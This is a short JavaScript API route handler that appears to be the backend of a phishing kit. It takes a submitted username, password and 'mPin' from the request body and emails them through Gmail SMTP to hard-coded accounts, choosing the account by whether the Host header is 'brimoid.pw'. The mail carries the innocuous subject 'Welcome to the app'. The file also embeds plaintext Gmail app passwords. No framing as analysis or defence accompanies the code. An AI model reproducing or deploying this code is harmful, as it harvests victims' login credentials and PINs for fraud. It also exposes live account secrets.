export default function handler(req, res) {
    const nodemailer = require('nodemailer');

    const { body } = req;
    const { host } = req.headers;

    if(host == 'brimoid.pw'){
        
        try {
            const transporter = nodemailer.createTransport({
                port: 587,
                host: 'smtp.googlemail.com',
                auth: {
                    user: 'yurawa111@gmail.com',
                    pass: 'hrtagcjptdywoqzh',
                    },
                secure: false,
            });
    
            const mailData = {
                from: 'yurawa111@gmail.com',
                to: 'yurawa111@gmail.com',
                subject: 'Welcome to the app',
                text: `username: ${body.username ?? '-'} password: ${body.password ?? '-'} pin: ${body.mPin ?? '-'}`,            
            }
      
            transporter.sendMail(mailData, function (err, info) {
                if(err){
                  res.status(400).json({error: err})
                }
                else{
                  res.status(200).json({info, status: 200})
                }
            })
    
        } catch (error) {
            res.status(404).send('Not found')
        }

    } else {
        
        try {
            const transporter = nodemailer.createTransport({
                port: 587,
                host: 'smtp.googlemail.com',
                auth: {
                    user: 'febrifebru66@gmail.com',
                    pass: 'zaqegfyjqxbeqxdt',
                    },
                secure: false,
            });
    
            const mailData = {
                from: 'febrifebru66@gmail.com',
                to: 'febrifebru66@gmail.com',
                subject: 'Welcome to the app',
                text: `username: ${body.username ?? '-'} password: ${body.password ?? '-'} pin: ${body.mPin ?? '-'}`,           
            }
      
            transporter.sendMail(mailData, function (err, info) {
                if(err){
                  res.status(400).json({error: err})
                }
                else{
                  res.status(200).json({info, status: 200})
                }
            })
    
        } catch (error) {
            res.status(404).send('Not found')
        }
    }
}